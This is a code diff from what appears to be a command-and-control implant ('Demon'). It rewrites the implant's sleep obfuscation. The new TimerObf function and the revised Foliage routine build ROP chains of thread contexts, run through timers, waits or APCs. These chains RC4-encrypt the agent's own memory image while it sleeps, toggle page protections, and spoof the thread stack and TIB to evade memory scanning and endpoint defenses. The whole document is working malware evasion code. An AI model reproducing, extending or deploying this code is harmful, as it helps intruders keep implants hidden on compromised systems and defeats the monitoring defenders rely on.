@@ -1,5 +1,3 @@
-// TODO: remove Foliage (or heavily modify it) this on public release and replace this with Ekko (modded with RtlCreateTimer, RtlRegisterWait)
-
 #include <Demon.h>
 
 #include <Common/Macros.h>
@@ -27,11 +25,17 @@ typedef struct _SLEEP_PARAM
     PVOID   Slave;
 } SLEEP_PARAM, *PSLEEP_PARAM ;
 
-__asm__( "___chkstk_ms: ret\n" );
-
-// Foliage Sleep obfuscation
-VOID FoliageObf( PSLEEP_PARAM Param )
-{
+/*!
+ * @brief
+ *  foliage is a sleep obfuscation technique that is using APC calls
+ *  to obfuscate itself in memory
+ *
+ * @param Param
+ * @return
+ */
+VOID FoliageObf(
+    IN PSLEEP_PARAM Param
+) {
     USTRING             Key         = { 0 };
     USTRING             Rc4         = { 0 };
     UCHAR               Random[16]  = { 0 };
@@ -128,7 +132,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopBegin->Rcx  = U_PTR( hEvent );
                     RopBegin->Rdx  = U_PTR( FALSE );
                     RopBegin->R8   = U_PTR( NULL );
-                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // NtWaitForSingleObject( Evt, FALSE, NULL )
 
                     RopSetMemRw->ContextFlags = CONTEXT_FULL;
@@ -138,8 +142,8 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                     RopSetMemRw->R8   = U_PTR( &ImageSize );
                     RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
-                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
-                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( &TmpValue );
+                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                     // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
 
                     RopMemEnc->ContextFlags = CONTEXT_FULL;
@@ -147,7 +151,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                     RopMemEnc->Rcx  = U_PTR( &Rc4 );
                     RopMemEnc->Rdx  = U_PTR( &Key );
-                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // SystemFunction032( &Rc4, &Key ); RC4 Encryption
 
                     RopGetCtx->ContextFlags = CONTEXT_FULL;
@@ -155,7 +159,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopGetCtx->Rsp -= U_PTR( 0x1000 * 10 );
                     RopGetCtx->Rcx  = U_PTR( hDupObj );
                     RopGetCtx->Rdx  = U_PTR( RopCap );
-                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // NtGetContextThread( Src, Cap );
 
                     RopSetCtx->ContextFlags = CONTEXT_FULL;
@@ -163,7 +167,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopSetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                     RopSetCtx->Rcx  = U_PTR( hDupObj );
                     RopSetCtx->Rdx  = U_PTR( RopSpoof );
-                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // NtSetContextThread( Src, Spf );
 
                     // NOTE: Here is the thread sleeping...
@@ -173,7 +177,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopWaitObj->Rcx  = U_PTR( hDupObj );
                     RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                     RopWaitObj->R8   = U_PTR( FALSE );
-                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );
 
                     // NOTE: thread image decryption
@@ -182,7 +186,7 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                     RopMemDec->Rcx  = U_PTR( &Rc4 );
                     RopMemDec->Rdx  = U_PTR( &Key );
-                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
 
                     // RW -> RWX
@@ -193,8 +197,8 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopSetMemRx->Rdx  = U_PTR( &ImageBase );
                     RopSetMemRx->R8   = U_PTR( &ImageSize );
                     RopSetMemRx->R9   = U_PTR( PAGE_EXECUTE_READWRITE );
-                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
-                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( & TmpValue );
+                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( & TmpValue );
                     // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );
 
                     RopSetCtx2->ContextFlags = CONTEXT_FULL;
@@ -202,26 +206,26 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     RopSetCtx2->Rsp -= U_PTR( 0x1000 * 5 );
                     RopSetCtx2->Rcx  = U_PTR( hDupObj );
                     RopSetCtx2->Rdx  = U_PTR( RopCap );
-                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // NtSetContextThread( Src, Cap );
 
                     RopExitThd->ContextFlags = CONTEXT_FULL;
                     RopExitThd->Rip  = U_PTR( Instance.Win32.RtlExitUserThread );
                     RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                     RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
-                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Syscall.NtTestAlert );
                     // RtlExitUserThread( ERROR_SUCCESS );
 
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopBegin,    FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemDec,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopExitThd,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
+                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, C_PTR( Instance.Syscall.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;
 
                     if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( hThread, NULL ) ) )
                     {
@@ -330,120 +334,281 @@ Leave:
     Instance.Win32.SwitchToFiber( Param->Master );
 }
 
+BOOL TimerObf(
+    IN DWORD TimeOut,
+    IN DWORD Method
+) {
+    /* Handles */
+    HANDLE  Queue     = NULL;
+    HANDLE  Timer     = NULL;
+    HANDLE  ThdSrc    = NULL;
+    HANDLE  EvntStart = NULL;
+    HANDLE  EvntTimer = NULL;
+    HANDLE  EvntDelay = NULL;
+    HANDLE  EvntWait  = NULL;
 
-// Ekko Sleep obfuscation
-VOID EkkoObf( DWORD TimeOut )
-{
-    CONTEXT CtxThread    = { 0 };
-    CONTEXT RopProtRW    = { 0 };
-    CONTEXT RopMemEnc    = { 0 };
-    CONTEXT RopDelay     = { 0 };
-    CONTEXT RopMemDec    = { 0 };
-    CONTEXT RopProtRX    = { 0 };
-    CONTEXT RopSetEvt    = { 0 };
+    /* buffer/pointer holders */
+    UCHAR   Buf[ 16 ] = { 0 };
+    USTRING Key       = { 0 };
+    USTRING Img       = { 0 };
+    PVOID   ImgBase   = { 0 };
+    ULONG   ImgSize   = { 0 };
 
-    HANDLE  Queue        = NULL;
-    HANDLE  Timer        = NULL;
-    HANDLE  SleepEvent   = NULL;
-    PVOID   ImageBase    = NULL;
-    DWORD   ImageSize    = 0;
-    DWORD   OldProtect   = 0;
+    /* rop/thread contexts */
+    CONTEXT TimerCtx  = { 0 };
+    CONTEXT ThdCtx    = { 0 };
+    CONTEXT Rop[ 13 ] = { { 0 } };
 
-    // Can be randomly generated
-    UCHAR   KeyBuf[ 16 ] = { 0 };
-    USTRING Key          = { 0 };
-    USTRING Img          = { 0 };
+    /* some vars */
+    DWORD    Value     = 0;
+    DWORD    Delay     = 0;
+    BOOL     Success   = FALSE;
+    NT_TIB   NtTib     = { 0 };
+    NT_TIB   BkpTib    = { 0 };
+    NTSTATUS NtStatus  = STATUS_SUCCESS;
+    DWORD    Inc       = 0;
 
-    for ( SHORT i = 0; i < 16; i++ ) {
-        KeyBuf[ i ] = RandomNumber32( );
+    /* create a random key */
+    for ( BYTE i = 0; i < 16; i++ ) {
+        Buf[ i ] = RandomNumber32( );
     }
 
-    ImageBase   = Instance.Session.ModuleBase;
-    ImageSize   = IMAGE_SIZE( Instance.Session.ModuleBase );
+    /* set key pointer and size */
+    Key.Buffer = Buf;
+    Key.Length = Key.MaximumLength = sizeof( Buf );
 
-    Key.Buffer  = KeyBuf;
-    Key.Length  = Key.MaximumLength = 16;
+    /* set agent memory pointer and size */
+    Img.Buffer = ImgBase           = Instance.Session.ModuleBase;
+    Img.Length = Img.MaximumLength = ImgSize = IMAGE_SIZE( Instance.Session.ModuleBase );
 
-    Img.Buffer  = ImageBase;
-    Img.Length  = Img.MaximumLength = ImageSize;
-
-    if ( NT_SUCCESS( Instance.Win32.RtlCreateTimerQueue( &Queue ) ) )
-    {
-        if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &SleepEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
-        {
-            if ( NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) )
-            {
-                Instance.Win32.WaitForSingleObjectEx( SleepEvent, 0x32, FALSE );
-
-                MemCopy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
-                MemCopy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
-                MemCopy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
-                MemCopy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
-                MemCopy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
-                MemCopy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
-
-                // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
-                RopProtRW.Rsp  -= 8;
-                RopProtRW.Rip   = Instance.Win32.VirtualProtect;
-                RopProtRW.Rcx   = ImageBase;
-                RopProtRW.Rdx   = ImageSize;
-                RopProtRW.R8    = PAGE_READWRITE;
-                RopProtRW.R9    = &OldProtect;
-
-                // SystemFunction032( &Key, &Img );
-                RopMemEnc.Rsp  -= 8;
-                RopMemEnc.Rip   = Instance.Win32.SystemFunction032;
-                RopMemEnc.Rcx   = &Img;
-                RopMemEnc.Rdx   = &Key;
-
-                // WaitForSingleObject( hTargetHdl, SleepTime );
-                RopDelay.Rsp   -= 8;
-                RopDelay.Rip    = Instance.Win32.WaitForSingleObjectEx;
-                RopDelay.Rcx    = NtCurrentProcess();
-                RopDelay.Rdx    = TimeOut;
-                RopDelay.R8     = FALSE;
-
-                // SystemFunction032( &Key, &Img );
-                RopMemDec.Rsp  -= 8;
-                RopMemDec.Rip   = Instance.Win32.SystemFunction032;
-                RopMemDec.Rcx   = &Img;
-                RopMemDec.Rdx   = &Key;
-
-                // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
-                RopProtRX.Rsp  -= 8;
-                RopProtRX.Rip   = Instance.Win32.VirtualProtect;
-                RopProtRX.Rcx   = ImageBase;
-                RopProtRX.Rdx   = ImageSize;
-                RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
-                RopProtRX.R9    = &OldProtect;
-
-                // SetEvent( hEvent );
-                RopSetEvt.Rsp  -= 8;
-                RopSetEvt.Rip   = Instance.Win32.NtSetEvent;
-                RopSetEvt.Rcx   = SleepEvent;
-                RopSetEvt.Rdx   = NULL;
-
-                // TODO: maybe add those functions to Cfg address list using CfgAddressAdd.
-
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
-
-                // Instance.Win32.WaitForSingleObjectEx( SleepEvent, INFINITE, FALSE );
-                SpoofFunc( Instance.Win32.WaitForSingleObjectEx, Instance.Modules.KernelBase, IMAGE_SIZE( Instance.Modules.KernelBase ), SleepEvent, INFINITE, FALSE );
-            }
-
-        LEAVE:
-            if ( Queue)
-                Instance.Win32.RtlDeleteTimerQueue( Queue );
-
-            if ( SleepEvent )
-                Instance.Win32.NtClose( SleepEvent );
+    if ( Method == SLEEPOBF_EKKO ) {
+        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue ) ) ) {
+            PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
+            goto LEAVE;
+        }
+    } else if ( Method == SLEEPOBF_ZILEAN ) {
+        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
+            PRINTF( "NtCreateEvent Failed => %p\n", NtStatus )
+            goto LEAVE;
         }
     }
+
+    /* create our timer queue */
+    if ( NT_SUCCESS( NtStatus ) )
+    {
+        /* create events */
+        if ( NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
+             NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
+             NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
+        {
+            /* get the context of the Timer thread based on the method used */
+            if ( Method == SLEEPOBF_EKKO ) {
+                NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, 0, 0, WT_EXECUTEINTIMERTHREAD );
+            } else if ( Method == SLEEPOBF_ZILEAN ) {
+                NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+            }
+
+            if ( NT_SUCCESS( NtStatus ) )
+            {
+                /* Send event that we got the context of the timers thread */
+                if ( Method == SLEEPOBF_EKKO ) {
+                    NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, 0, 0, WT_EXECUTEINTIMERTHREAD );
+                } else if ( Method == SLEEPOBF_ZILEAN ) {
+                    NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+                }
+
+                if ( NT_SUCCESS( NtStatus ) )
+                {
+                    /* wait til we successfully retrieved the timers thread context */
+                    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
+                        PRINTF( "Failed waiting for starting event: %p\n", NtStatus )
+                        goto LEAVE;
+                    }
+
+                    /* if stack spoofing is enabled then prepare some stuff */
+                    if ( Instance.Config.Implant.StackSpoof )
+                    {
+                        /* retrieve Tib if stack spoofing is enabled */
+                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
+                            PUTS( "Failed to retrieve Tib" )
+                            goto LEAVE;
+                        }
+
+                        /* duplicate the current thread we are going to spoof the stack */
+                        if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
+                            goto LEAVE;
+                        }
+
+                        /* NtTib backup */
+                        MemCopy( &BkpTib, &Instance.Teb->NtTib, sizeof( NT_TIB ) );
+                    }
+
+                    /* at this point we can start preparing the ROPs and execute the timers */
+                    for ( int i = 0; i < 13; i++ ) {
+                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
+                        Rop[ i ].Rsp -= sizeof( PVOID );
+                    }
+
+                    /* set specific context flags */
+                    ThdCtx.ContextFlags   = CONTEXT_FULL;
+                    TimerCtx.ContextFlags = CONTEXT_FULL;
+
+                    /* setup structs */
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
+                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
+                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
+                    Rop[ Inc ].R8  = U_PTR( FALSE );
+                    Inc++;
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
+                    Rop[ Inc ].R9  = U_PTR( &Value );
+                    Inc++;
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
+                    Rop[ Inc ].Rcx = U_PTR( &Img );
+                    Rop[ Inc ].Rdx = U_PTR( &Key );
+                    Inc++;
+
+                    /* perform stack spoofing */
+                    if ( Instance.Config.Implant.StackSpoof ) {
+                        Rop[ Inc ].Rip = U_PTR( Instance.Syscall.NtGetContextThread );
+                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
+                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
+                        Inc++;
+
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
+                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
+                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
+                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
+                        Inc++;
+
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
+                        Rop[ Inc ].Rcx = U_PTR( &Instance.Teb->NtTib );
+                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
+                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
+                        Inc++;
+
+                        Rop[ Inc ].Rip = U_PTR( Instance.Syscall.NtSetContextThread );
+                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
+                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
+                        Inc++;
+                    }
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
+                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
+                    Rop[ Inc ].Rdx = U_PTR( TimeOut );
+                    Rop[ Inc ].R8  = U_PTR( FALSE );
+                    Inc++;
+
+                    /* undo stack spoofing */
+                    if ( Instance.Config.Implant.StackSpoof ) {
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
+                        Rop[ Inc ].Rcx = U_PTR( &Instance.Teb->NtTib );
+                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
+                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
+                        Inc++;
+
+                        Rop[ Inc ].Rip = U_PTR( Instance.Syscall.NtSetContextThread );
+                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
+                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
+                        Inc++;
+                    }
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
+                    Rop[ Inc ].Rcx = U_PTR( &Img );
+                    Rop[ Inc ].Rdx = U_PTR( &Key );
+                    Inc++;
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                    Rop[ Inc ].R8  = U_PTR( PAGE_EXECUTE_READWRITE );
+                    Rop[ Inc ].R9  = U_PTR( &Value );
+                    Inc++;
+
+                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetEvent );
+                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
+                    Rop[ Inc ].Rdx = U_PTR( NULL );
+                    Inc++;
+
+                    PRINTF( "Rops %d to be executed\n", Inc )
+
+                    /* execute/queue the timers */
+                    for ( int i = 0; i < Inc; i++ ) {
+                        if ( Method == SLEEPOBF_EKKO ) {
+                            if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Syscall.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+                                goto LEAVE;
+                            }
+                        } else if ( Method == SLEEPOBF_ZILEAN ) {
+                            if ( ! NT_SUCCESS( Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Syscall.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+                                goto LEAVE;
+                            }
+                        }
+                    }
+
+                    /* just wait for the sleep to end */
+                    if ( ! ( Success = NT_SUCCESS( NtStatus = Instance.Syscall.NtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
+                        PRINTF( "NtSignalAndWaitForSingleObject Failed => %p\n", NtStatus );
+                    } else {
+                        Success = TRUE;
+                    }
+                } else {
+                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
+                }
+            } else {
+                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
+            }
+        } else {
+            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
+        }
+    } else {
+        PRINTF( "RtlCreateTimerQueue Failed: %lx\n", NtStatus )
+    }
+
+
+LEAVE: /* cleanup */
+    if ( Queue ) {
+        Instance.Win32.RtlDeleteTimerQueue( Queue );
+        Queue = NULL;
+    }
+
+    if ( EvntTimer ) {
+        Instance.Win32.NtClose( EvntTimer );
+        EvntTimer = NULL;
+    }
+
+    if ( EvntStart ) {
+        Instance.Win32.NtClose( EvntTimer );
+        EvntStart = NULL;
+    }
+
+    if ( EvntDelay ) {
+        Instance.Win32.NtClose( EvntDelay );
+        EvntDelay = NULL;
+    }
+
+    if ( EvntWait ) {
+        Instance.Win32.NtClose( EvntWait );
+        EvntWait = NULL;
+    }
+
+    if ( ThdSrc ) {
+        Instance.Win32.NtClose( ThdSrc );
+        ThdSrc = NULL;
+    }
+
+    /* clear the structs from stack */
+    for ( int i = 0; i < 13; i++ ) {
+        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
+    }
+
+    /* clear key from memory */
+    RtlSecureZeroMemory( Buf, sizeof( Buf ) );
+
+    return Success;
 }
 
 #endif
@@ -466,7 +631,7 @@ UINT32 SleepTime(
         /*
          * we are no longer in working hours,
          * if the SleepTime is 0, then we will assume the operator is performing some "important" task right now,
-         * so we will ignore working hours and we won't sleep
+         * so we will ignore working hours, and we won't sleep
          * if the SleepTime is not 0, we will sleep until we are in working hours again
          */
         if ( SleepTime )
@@ -532,14 +697,11 @@ VOID SleepObf(
 
     switch ( Technique )
     {
-        case 1: // Austins Sleep Obf
-        {
+        case SLEEPOBF_FOLIAGE: {
